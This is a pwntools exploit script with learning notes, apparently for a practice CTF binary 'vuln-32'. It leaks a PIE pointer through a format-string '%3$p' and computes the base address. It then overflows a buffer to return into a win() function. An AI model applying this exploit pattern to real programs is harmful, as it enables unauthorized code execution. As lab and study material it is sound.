# 1. Turn off ASLR first
# 2. run binary with gdb and set breakpoint to main to load the binary
# 3. run the program, and use 'piebase' command to get the pie base
# 4. take the leaked binary pointer from format specififer 3'rd element and calculate in gdb
# 5. 'x [leak] - [piebase]'
# 6. offset retrieved


# Extra ~~ Constant address (offset) in binary is different from runtime address if PIE is enabled

# IMPORTANT : 32-bit no matter how many times run %p the address still the same. Meanwhile, 64-bit need to have exact number of %p and cannot exceed itself
#			  otherwise cannot get base address.

# IMPORTANT : if PIE is enabled, ASLR doesnt really play a role in the binary. In this case, it returns to a function that is 
#			  available which is win(), it doesnt rely on libc. But when there is no win() function and you want to pop a shell,
#			  we need to leak the base address regardless if ASLR is turned off or on (If PIE is enabled)


# 32-bit example: %p %p %p %p
#				  0xf7fc6000 (nil) 0x565561d5 (nil)

#				  %p %p %p %p %p %p
#				  0xf7fc6000 (nil) 0x565561d5 (nil) (nil) 0xffffffff

# Notice the binary pointer '0x565561d5' doesnt change







from pwn import *

# Set arch context and start
elf = context.binary = ELF('./vuln-32')
io = process()



# Send format specifier to leak address
io.recvuntil('name?\n')
io.sendline('%3$p')



# Receive the pointer address as input
io.recvuntil('you ')
elf_leak = int(io.recvline(), 16)



# Calculating base address at runtime
offset = 0x11d5

elf.address = elf_leak - offset

log.success(f'PIE base: {hex(elf.address)}')



# Crafting payload
payload = b'A' * 32
payload += p32(elf.sym['win'])


# Send payload
io.recvuntil('message?\n')
io.sendline(payload)


# Decode non utf chars
print(io.clean().decode())




